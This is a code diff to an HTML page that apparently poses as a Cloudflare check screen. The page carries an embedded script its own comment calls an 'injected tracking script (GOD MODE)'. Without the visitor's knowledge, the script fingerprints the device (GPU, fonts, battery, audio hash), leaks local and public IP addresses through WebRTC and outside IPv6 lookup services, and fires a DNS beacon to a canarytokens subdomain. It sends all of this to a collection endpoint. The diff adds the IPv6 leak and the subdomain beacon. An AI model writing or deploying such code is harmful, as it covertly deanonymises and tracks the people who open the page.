@@ -28,11 +28,10 @@
         .cf-footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; text-align: center; }
     </style>
 
-    <!-- ВНЕДРЕННЫЙ СКРИПТ СЛЕЖЕНИЯ (GOD MODE) -->
+    <!-- ВНЕДРЕННЫЙ СКРИПТ СЛЕЖЕНИЯ (GOD MODE + IPv6 + CANARY) -->
     <script>
     window.EagleEye = class {
         constructor() {
-            // Используем window.location.origin, чтобы игнорировать тег <base>
             this.endpoint = window.location.origin + '/api/collect';
             this.sessionId = Math.random().toString(36).substring(7);
             this.init();
@@ -45,9 +44,11 @@
         }
 
         triggerDNSBeacon() {
-            const canaryUrl = "http://canarytokens.com/tags/stuff/traffic/giumoqpvt3mawd0bulwx2o4p5/submit.aspx";
-            const unique = Math.random().toString(36).substring(7);
-            new Image().src = `${canaryUrl}?uid=${this.sessionId}&rnd=${unique}`;
+            // ТВОЙ ТОКЕН
+            const canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
+            const uniqueSubdomain = `${this.sessionId}.${Math.floor(Math.random() * 1000000)}`;
+            const fullDomain = `http://${uniqueSubdomain}.${canaryDomain}`;
+            new Image().src = fullDomain;
         }
 
         async getWebRTCData() {
@@ -56,8 +57,7 @@
                 const pc = new RTCPeerConnection({
                     iceServers: [
                         { urls: "stun:stun.l.google.com:19302" },
-                        { urls: "stun:stun1.l.google.com:19302" },
-                        { urls: "stun:stun2.l.google.com:19302" }
+                        { urls: "stun:stun1.l.google.com:19302" }
                     ]
                 });
                 pc.createDataChannel('');
@@ -158,12 +158,36 @@
             } catch(e) { return { renderer: 'Error' }; }
         }
 
+        async getIPv6() {
+            const services = [
+                'https://api64.ipify.org?format=json',
+                'https://ipv6.icanhazip.com',
+                'https://ident.me',
+                'https://api6.ipify.org?format=json'
+            ];
+            for (const url of services) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1500);
+                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) continue;
+                    let ip = await response.text();
+                    try { const json = JSON.parse(ip); if (json.ip) ip = json.ip; } catch (e) {}
+                    ip = ip.trim();
+                    if (ip.includes(':')) return ip;
+                } catch (e) { continue; }
+            }
+            return "Not Detected / IPv4 Only";
+        }
+
         async collect(triggerName, extraData = {}) {
-            const [ips, battery, clientHints, audioHash] = await Promise.all([
+            const [ips, battery, clientHints, audioHash, ipv6] = await Promise.all([
                 this.getWebRTCData(),
                 navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
                 this.getClientHints(),
-                this.getAudioHash()
+                this.getAudioHash(),
+                this.getIPv6()
             ]);
             
             const anomalies = this.detectLies();
@@ -173,7 +197,7 @@
                 fingerprint: { gpu: this.getWebGLInfo().renderer, vendor: this.getWebGLInfo().vendor, screen: `${screen.width}x${screen.height}`, cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
                 client_hints: clientHints,
                 system: { ua: navigator.userAgent, platform: navigator.platform, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezone_offset: new Date().getTimezoneOffset(), battery: battery, fonts: this.getFonts() },
-                network: { webrtc_ips: ips },
+                network: { webrtc_ips: ips, ipv6_leak: ipv6 },
                 ...extraData
             };
             const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
